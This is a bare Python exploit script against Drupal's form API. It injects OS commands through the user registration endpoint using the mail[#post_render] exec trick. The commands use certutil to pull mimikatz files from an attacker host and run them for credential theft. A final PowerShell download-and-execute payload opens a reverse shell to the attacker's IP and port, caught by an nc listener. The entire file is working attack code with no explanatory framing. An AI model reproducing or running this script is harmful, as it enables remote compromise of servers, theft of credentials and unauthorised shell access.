#!/usr/bin/python3

import requests
import base64
from subprocess import call
from threading import Thread
requests.packages.urllib3.disable_warnings() 


target = "http://cords.com/"
attacker_ip = "10.0.10.214"
attacker_port = "53"


command = "certutil.exe -urlcache -split -f http://" + attacker_ip + "/c2/mimikatz.cmd mimikatz.cmd"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec'
, 'mail[#type]': 'markup', 'mail[#markup]': command }

r = requests.post(url, data=payload, verify=False)


command = "certutil.exe -urlcache -split -f http://" + attacker_ip + "/c2/mimikatz.exe mimikatz.exe"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec'
, 'mail[#type]': 'markup', 'mail[#markup]': command }

r = requests.post(url, data=payload, verify=False)

command = "mimikatz.cmd"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec'
, 'mail[#type]': 'markup', 'mail[#markup]': command }

r = requests.post(url, data=payload, verify=False)


command = "powershell -c IEX (New-Object Net.WebClient).downloadstring('http://" + attacker_ip + "/c2/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress "+attacker_ip+" -Port "+attacker_port

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
# print("Sending Payload to: "+target+" ...")
# call("nc -lvp 53", shell=True)
# r = requests.post(url, data=payload)
# print("Payload Sent.")


def func1():
    r = requests.post(url, data=payload, verify=False)

def func2():
    call("nc -lvp 53", shell=True)

if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
